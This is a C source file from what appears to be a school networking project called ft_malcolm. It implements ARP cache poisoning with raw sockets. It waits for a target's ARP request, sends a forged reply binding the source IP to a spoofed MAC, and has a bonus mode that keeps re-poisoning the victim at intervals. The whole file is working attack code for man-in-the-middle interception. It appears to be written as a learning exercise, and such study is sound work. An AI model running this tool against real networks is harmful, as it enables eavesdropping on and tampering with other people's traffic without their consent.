/* ************************************************************************** */
/*                                                                            */
/*   arp.c - receive the target's ARP request, send the spoofed reply.       */
/*                                                                            */
/* ************************************************************************** */

#include "ft_malcolm.h"

/*
** Decide whether a received ARP frame is the one we are waiting for:
**   - it is an ARP *request* (oper == 1);
**   - the sender protocol address (who is asking) is the target's IP;
**   - the requested protocol address (what is asked) is the source IP.
** In other words: the victim broadcasts "who has <source_ip>?".
*/
static int	is_target_request(const t_arp_frame *arp)
{
	if (arp->eth_type != htons(ETH_P_ARP))
		return (0);
	if (arp->oper != htons(ARPOP_REQUEST))
		return (0);
	if (ft_memcmp(arp->spa, &g_malcolm.tgt_ip, IPV4_LEN) != 0)
		return (0);
	if (ft_memcmp(arp->tpa, &g_malcolm.src_ip, IPV4_LEN) != 0)
		return (0);
	return (1);
}

/* Report the sender of the matched request, as in the subject example. */
static void	announce_request(const t_arp_frame *arp)
{
	char	macbuf[18];
	char	ipbuf[INET_ADDRSTRLEN];

	mac_to_string(arp->sha, macbuf);
	inet_ntop(AF_INET, arp->spa, ipbuf, sizeof(ipbuf));
	printf("An ARP request has been broadcast.\n");
	printf("mac address of request: %s\n", macbuf);
	printf("IP address of request: %s\n", ipbuf);
	if (g_malcolm.verbose)
		print_hex_dump("Received ARP request", (const uint8_t *)arp,
			sizeof(t_arp_frame));
	fflush(stdout);
}

/*
** Block on recvfrom() until the awaited ARP request arrives.
** Frames that do not match are silently ignored. EINTR is retried
** (although our SIGINT handler exits directly, so it rarely triggers).
*/
int	wait_for_request(void)
{
	uint8_t		buffer[65536];
	ssize_t		n;
	t_arp_frame	*arp;

	while (1)
	{
		n = recvfrom(g_malcolm.sockfd, buffer, sizeof(buffer), 0, NULL, NULL);
		if (n < 0)
		{
			if (errno == EINTR)
				continue ;
			return (error_msg(strerror(errno), NULL));
		}
		if ((size_t)n < sizeof(t_arp_frame))
			continue ;
		arp = (t_arp_frame *)buffer;
		if (is_target_request(arp))
		{
			announce_request(arp);
			return (0);
		}
	}
}

/* Fill the ARP reply frame with the spoofed source identity. */
static void	build_reply(t_arp_frame *arp)
{
	ft_memset(arp, 0, sizeof(*arp));
	ft_memcpy(arp->eth_dst, g_malcolm.tgt_mac, MAC_LEN);
	ft_memcpy(arp->eth_src, g_malcolm.src_mac, MAC_LEN);
	arp->eth_type = htons(ETH_P_ARP);
	arp->htype = htons(ARPHRD_ETHER);
	arp->ptype = htons(ETH_P_IP);
	arp->hlen = MAC_LEN;
	arp->plen = IPV4_LEN;
	arp->oper = htons(ARPOP_REPLY);
	ft_memcpy(arp->sha, g_malcolm.src_mac, MAC_LEN);
	ft_memcpy(arp->spa, &g_malcolm.src_ip, IPV4_LEN);
	ft_memcpy(arp->tha, g_malcolm.tgt_mac, MAC_LEN);
	ft_memcpy(arp->tpa, &g_malcolm.tgt_ip, IPV4_LEN);
}

/*
** Build the spoofed reply once and push it onto the wire with sendto().
** Shared by the one-shot mandatory path and the bonus repeat loop.
*/
static int	raw_send(void)
{
	t_arp_frame			reply;
	struct sockaddr_ll	dst;

	build_reply(&reply);
	ft_memset(&dst, 0, sizeof(dst));
	dst.sll_family = AF_PACKET;
	dst.sll_protocol = htons(ETH_P_ARP);
	dst.sll_ifindex = g_malcolm.ifindex;
	dst.sll_halen = MAC_LEN;
	ft_memcpy(dst.sll_addr, g_malcolm.tgt_mac, MAC_LEN);
	if (g_malcolm.verbose)
		print_hex_dump("Sending ARP reply", (const uint8_t *)&reply,
			sizeof(reply));
	if (sendto(g_malcolm.sockfd, &reply, sizeof(reply), 0,
			(struct sockaddr *)&dst, sizeof(dst)) < 0)
		return (error_msg(strerror(errno), NULL));
	return (0);
}

/*
** Send exactly one spoofed ARP reply to the target (mandatory behaviour).
** The reply says "<source_ip> is at <source_mac>", poisoning the victim.
*/
int	send_reply(void)
{
	printf("Now sending an ARP reply to the target address with spoofed "
		"source, please wait...\n");
	if (raw_send() != 0)
		return (1);
	printf("Sent an ARP reply packet, you may now check the arp table "
		"on the target.\n");
	fflush(stdout);
	return (0);
}

/*
** Bonus (-r): keep the victim's cache poisoned. After the first reply we
** re-broadcast the spoofed mapping every `interval` seconds until Ctrl+C.
** Uses the allowed sleep(); the SIGINT handler ends the loop cleanly.
*/
void	persist(void)
{
	printf("Repeat mode: re-poisoning every %u second(s), press Ctrl+C to "
		"stop...\n", g_malcolm.interval);
	fflush(stdout);
	while (1)
	{
		sleep(g_malcolm.interval);
		if (raw_send() != 0)
			return ;
		printf("Re-sent spoofed ARP reply.\n");
		fflush(stdout);
	}
}
